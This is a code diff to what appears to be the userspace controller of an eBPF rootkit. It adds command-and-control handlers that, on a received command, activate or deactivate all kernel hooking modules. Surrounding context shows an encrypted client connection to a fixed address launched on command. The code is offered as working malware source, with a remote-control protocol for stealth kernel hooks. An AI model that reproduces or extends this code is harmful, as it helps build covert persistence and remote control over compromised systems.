@@ -91,6 +91,7 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 	//For time displaying
 	struct tm *tm;
 	char ts[32];
+	int ret;
 	time_t t;
 	time(&t);
 	tm = localtime(&t);
@@ -112,6 +113,20 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 			//TODO EXTRACT IP FROM KERNEL BUFFER
 				printf("Starting encrypted connection\n");
 				client_run("127.0.1.1", 8500);
+            	break;
+			case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
+				printf("Activating all hooks as requested\n");
+				activate_all_modules_config();
+				ret = unhook_all_modules();
+				if(ret<0) printf("Failed to complete command: unhook all\n");
+				ret = setup_all_modules();
+				if(ret<0) printf("Failed to complete command: setup modules\n");
+            	break;
+			case CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL:
+				printf("Deactivating all hooks as requested\n");
+				deactivate_all_modules_config();
+				ret = unhook_all_modules();
+				if(ret<0) printf("Failed to complete command: unhook all\n");
             	break;
 			default:
 				printf("Command received unknown: %d\n", e->code);
